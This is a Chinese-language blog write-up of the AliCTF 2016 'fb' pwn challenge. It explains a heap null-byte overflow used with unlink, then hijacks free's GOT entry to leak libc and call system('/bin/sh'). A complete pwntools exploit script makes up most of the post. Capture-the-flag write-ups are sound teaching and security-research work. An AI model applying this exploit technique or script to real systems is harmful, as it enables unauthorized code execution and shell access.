<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> AliCTF 2016 fb writeup · Arvin.X's Blog</title><meta name="description" content="AliCTF 2016 fb writeup - Arvin.X"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://a7vinx.github.io/atom.xml" title="Arvin.X's Blog"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="https://github.com/a7vinx" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">AliCTF 2016 fb writeup</h1><div class="post-info">Jun 7, 2016</div><div class="post-content"><p>一道堆中的null byte溢出题</p>
<p>程序用连续两个8 bytes变量分别存储分配的堆指针和其size，然后将这样的结构体以数组的形式存储在全局变量区0x6020C0。主要逻辑就是每次新建一个message的时候，从0x6020C0开始找size为0的地方，之后调用malloc分配目标大小存储堆指针，删除的时候会先清size为0再调用free()释放内存</p>
<a id="more"></a>
<p>由于读取输入的时候会在最后再添加’\x00’：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">.text:00000000004008E4                 cdqe</div><div class="line">.text:00000000004008E6                 lea     rdx, [rax-1]</div><div class="line">.text:00000000004008EA                 mov     rax, [rbp+var_18]</div><div class="line">.text:00000000004008EE                 add     rax, rdx</div><div class="line">.text:00000000004008F1                 mov     byte ptr [rax], 0</div><div class="line">.text:00000000004008F4                 mov     eax, [rbp+var_8]</div><div class="line">.text:00000000004008F7                 sub     eax, 1</div></pre></td></tr></table></figure></p>
<p>所以可以构造payload溢出下一块chunk的size中的prev_inuse位，伪造prevsize字段，触发free()向前合并，就可以导致unlink使用我们伪造的fd和bk指针改写当前chunk的堆指针，使其指向0x6020C8（一开始忘了堆的对齐是加8 bytes再对齐，结果怎么也溢不出来…）</p>
<p>之后再编辑被修改过的堆指针就可以直接修改全局变量区了，由于只开了Partial级别的RELRO：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">CANARY    : ENABLED</div><div class="line">FORTIFY   : disabled</div><div class="line">NX        : ENABLED</div><div class="line">PIE       : disabled</div><div class="line">RELRO     : Partial</div></pre></td></tr></table></figure>
<p>所以可以考虑劫持free()的GOT到库中的system()，然后再有一个/bin/sh写在chunk中就可以拿shell了，在这之前得先泄漏一下库的地址过掉ASLR，所以先把free的GOT劫持到puts的PLT上，泄漏一下read()的地址，这里可以用<a href="https://github.com/niklasb/libc-database" target="_blank" rel="external">libc-database</a>这个工具来查找远程库的版本（但是不知道为什么我本地的库版本查不出来，只能手动查偏移），因为ASLR不会影响低12位的地址</p>
<p>然后泄漏出来算下偏移就可以调用system()了</p>
<p>Exploit:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">io=process(<span class="string">'./fb'</span>)</div><div class="line"><span class="comment"># io = remote("114.55.103.213",9733)</span></div><div class="line"></div><div class="line">SIZE=<span class="number">0xf8</span></div><div class="line">PLT_puts=<span class="number">0x4006C0</span></div><div class="line">GOT_free=<span class="number">0x602018</span></div><div class="line">GOT_read=<span class="number">0x602040</span></div><div class="line">FD=<span class="number">0x6020C8</span></div><div class="line">BK=<span class="number">0x6020D0</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">(size)</span>:</span></div><div class="line">	io.recvuntil(<span class="string">'Choice:'</span>)</div><div class="line">	io.sendline(<span class="string">'1'</span>)</div><div class="line">	io.recvuntil(<span class="string">'length:'</span>)</div><div class="line">	io.sendline(str(size))</div><div class="line">	io.recvuntil(<span class="string">'Done~'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></div><div class="line">	io.recvuntil(<span class="string">'Choice:'</span>)</div><div class="line">	io.sendline(<span class="string">'2'</span>)</div><div class="line">	io.recvuntil(<span class="string">'index:'</span>)</div><div class="line">	io.sendline(str(index))</div><div class="line">	io.recvuntil(<span class="string">'content:'</span>)</div><div class="line">	io.sendline(str(content))</div><div class="line">	io.recvuntil(<span class="string">'Done~'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></div><div class="line">	io.recvuntil(<span class="string">'Choice:'</span>)</div><div class="line">	io.sendline(<span class="string">'3'</span>)</div><div class="line">	io.recvuntil(<span class="string">'index:'</span>)</div><div class="line">	io.sendline(str(index))</div><div class="line">	io.recvuntil(<span class="string">'Done~'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(dst)</span>:</span></div><div class="line">	edit(<span class="number">1</span>,p64(dst)+p64(SIZE)[:<span class="number">-1</span>])</div><div class="line">	io.recvuntil(<span class="string">'Choice:'</span>)</div><div class="line">	io.sendline(<span class="string">'3'</span>)</div><div class="line">	io.recvuntil(<span class="string">'index:'</span>)</div><div class="line">	io.sendline(<span class="string">'0'</span>)</div><div class="line">	leakmem = io.recvuntil(<span class="string">"Done~"</span>)[:<span class="number">-6</span>]</div><div class="line">	<span class="keyword">return</span> str(leakmem)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line"></div><div class="line">	init(SIZE)</div><div class="line">	init(SIZE)</div><div class="line">	init(SIZE)</div><div class="line">	init(SIZE)</div><div class="line">	init(SIZE)</div><div class="line"></div><div class="line">	payload=p64(<span class="number">0xf1</span>)+p64(<span class="number">0xf1</span>)+p64(FD)+p64(BK)+<span class="string">'A'</span>*<span class="number">0xd0</span>+p64(<span class="number">0xf0</span>)</div><div class="line">	<span class="comment"># overflow null byte</span></div><div class="line">	edit(<span class="number">2</span>,payload)</div><div class="line">        <span class="comment"># gdb.attach(io,execute=("b *%s"%(0x400CCF)))</span></div><div class="line">	delete(<span class="number">3</span>)</div><div class="line">        </div><div class="line">	payload2=p64(SIZE)+p64(<span class="number">0x6020C0</span>)+p64(SIZE)+p64(GOT_free)+p64(SIZE)</div><div class="line">	edit(<span class="number">2</span>,payload2)</div><div class="line"></div><div class="line">	<span class="comment"># modify GOT entry of free to PLT entry of puts</span></div><div class="line">	<span class="comment"># use [:1] to prevent \x00 from causing damage</span></div><div class="line">	edit(<span class="number">2</span>,p64(PLT_puts)[:<span class="number">-1</span>])</div><div class="line"></div><div class="line">	<span class="comment"># leak read_addr</span></div><div class="line">	read_addr=u64(leak(GOT_read).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</div><div class="line">	<span class="keyword">print</span> <span class="string">"read_addr: "</span>+str(hex(read_addr))</div><div class="line"></div><div class="line"></div><div class="line">	system_addr=read_addr<span class="number">-0x980C0</span></div><div class="line">	<span class="comment"># system_addr= read_addr-0xeb6a0 +0x46590</span></div><div class="line">	</div><div class="line">	<span class="comment"># modify free to system</span></div><div class="line">	edit(<span class="number">2</span>,p64(system_addr)[:<span class="number">-1</span>])</div><div class="line">	edit(<span class="number">4</span>,<span class="string">"/bin/sh"</span>)</div><div class="line">	</div><div class="line">	<span class="comment"># now get shell</span></div><div class="line">	io.recvuntil(<span class="string">'Choice:'</span>)</div><div class="line">	io.sendline(<span class="string">'3'</span>)</div><div class="line">	io.recvuntil(<span class="string">'index:'</span>)</div><div class="line">	io.sendline(<span class="string">'4'</span>)</div><div class="line"></div><div class="line">	io.interactive()</div><div class="line"></div><div class="line">main()</div></pre></td></tr></table></figure>
</div></article></div></section><footer><div class="paginator"><a href="/2016/07/11/ciscnctf_2016_careful_writeup/" class="prev">PREV</a><a href="/2016/05/29/linux_heap_analysis/" class="next">NEXT</a></div><div class="copyright"><p>© 2015 - 2017 <a href="http://a7vinx.github.io">Arvin.X</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-MML-AM_CHTML"></script><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-65933410-1",'auto');ga('send','pageview');</script></body></html>